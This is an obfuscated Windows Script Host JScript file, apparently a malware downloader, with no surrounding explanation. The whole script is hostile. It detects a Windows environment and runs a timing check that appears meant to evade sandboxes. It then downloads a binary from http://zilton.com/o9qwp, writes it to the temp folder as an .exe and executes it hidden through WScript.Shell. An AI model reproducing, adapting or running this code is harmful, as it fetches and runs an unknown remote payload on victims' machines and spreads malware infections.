var m = false;
var L = "CreateObject";
var gp = function Y() {return WScript[L]("WScript.Shell");}(), t = 11;
var ie = "MSXML2.XMLHTTP";
var Z = 2123213;
var tM = 0;
function A(fz){gp["Run"](fz, tM, tM);};
function VS(){return "" + ie;};
function lb(NR, Xo){tM = tM * 1; return NR - Xo;};
function pA(){return L;};
/*@cc_on
  @if (@_win32 || @_win64)
    m = true;
  @end
@*/
if (m)
{
var w = "";
function Yf(){return 22;};
var pM = 0; var tr = 0;
function g()
{
var l = new this["Date"]();
var aG = l["getUTCMilliseconds"]();
WScript["Sleep"](Yf());
var l = new this["Date"]();
var kV = l["getUTCMilliseconds"]();
WScript["Sleep"](Yf());
var l = new this["Date"]();
var w0 = l["getUTCMilliseconds"]();
var pM = "Ro";
pM = lb(kV, aG);
var tr = "J";
tr = lb(w0, kV);
w = "open";
return lb(pM, tr);
}
var Yu = false;
var f = false;
for (var o = tM; o < Yf() * 1; o++){if (g() != tM){
Yu = true; 
tr = "31" + 11 * pM + tr; 
f = true; 
break;
}}
function y() {return ((Yu == true) && (Yu == f)) ? 1 : tM;};
if (Yu && y() && f){
function WC() {return gp["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ubhyAgks2c.exe";};
 F = VS();
 z = WScript[L](F);
 var Kn = 1;
 while (Kn){
try {
z[w]("GET", "http://zilton.com/o9qwp", false);
z["send"]();
uu = "Sleep";
for (;;){WScript[uu](Yf() * 11); if (z["readystate"] >= 2 * 2) break;};
Kn = tM;
} catch(kO){};
}
function iX(Jo) {var x = (1, 2, 3, 4, 5, Jo); return x;};
VJ = WScript[pA()]("ADODB.Stream");
F = VJ;
F[w]();
F["type"] = iX(1);
F["write"](z["ResponseBody"]);
VJ["position"] = iX(tM);
F["Save" + "ToFile"](WC(), 2);
VJ["c"+"lose"]();
v = WC();
A(v);
}
}

